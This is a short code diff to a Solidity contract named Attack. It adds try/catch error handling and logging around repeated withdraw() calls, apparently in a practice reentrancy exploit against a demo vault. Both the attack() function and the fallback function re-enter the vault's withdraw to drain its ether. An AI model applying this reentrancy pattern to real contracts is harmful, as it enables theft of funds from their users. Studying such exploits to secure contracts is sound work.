@@ -23,14 +23,30 @@ contract Attack{
     function attack() public{
         uint256 vaultBalance = myvault.getEtherBalance();
         if(vaultBalance >= 1 ether){
-            myvault.withdraw();
+            try myvault.withdraw()
+			{
+				console.log("attack(): Attack successful");
+			}
+			catch Error(string memory reason)
+			{
+				console.log("attack(): ", reason);
+				revert(reason);
+			}
         }
     }
 
     fallback() external payable{
         uint256 vaultBalance = myvault.getEtherBalance();
         if(vaultBalance >= 1 ether){
-            myvault.withdraw();
+            try myvault.withdraw()
+			{
+				console.log("fallback(): Attack successful");
+			}
+			catch Error(string memory reason)
+			{
+				console.log("fallback(): ", reason);
+				revert(reason);
+			}
         }
     }
     
